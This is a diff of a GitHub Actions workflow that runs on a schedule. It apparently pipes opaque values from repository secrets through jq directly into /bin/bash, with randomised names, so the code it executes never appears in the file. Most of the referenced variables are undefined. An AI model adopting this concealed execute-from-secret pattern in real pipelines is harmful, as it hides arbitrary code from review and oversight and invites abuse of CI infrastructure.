@@ -1,31 +1,24 @@
 name: liyueqing1829
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 2/6 * * *'
+    - cron: '6 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: liyueqing1829
         env:
-          ar766: ${{ secrets.ar766 }}
+          tuo44632: ${{ secrets.tuo44632 }}
         run: |
-          echo $ar766 | jq -r .v38739 | /bin/bash
-          echo $haw9 | jq -r .jriw7 | /bin/bash
-          echo $s977 | jq -r .npxs7 | /bin/bash
-          echo $vie231 | jq -r .knlu98929 | /bin/bash
-          echo $ixuh5116 | jq -r .z36388 | /bin/bash
-          echo $brfv749 | jq -r .slx72324 | /bin/bash
-          echo $ggd0517 | jq -r .oewbu238 | /bin/bash
-          echo $aokwu1391 | jq -r .iap40 | /bin/bash
-          echo $jleyx99 | jq -r .islax3676 | /bin/bash
-          echo $jytxt46360 | jq -r .atr12707 | /bin/bash
-          echo $mkis31 | jq -r .mk1836 | /bin/bash
-          echo $n282 | jq -r .d1 | /bin/bash
-          echo $d474 | jq -r .rd908 | /bin/bash
-          echo $xbsee3859 | jq -r .lw309 | /bin/bash
-          echo $ij7000 | jq -r .wi0 | /bin/bash
+          echo $tuo44632 | jq -r .zjp9888 | /bin/bash
+          echo $aw641 | jq -r .fb34587 | /bin/bash
+          echo $dg2044 | jq -r .rer6 | /bin/bash
+          echo $fg45 | jq -r .e0327 | /bin/bash
+          echo $e5096 | jq -r .v63 | /bin/bash
+          echo $pw6147 | jq -r .tzgbn4164 | /bin/bash
 
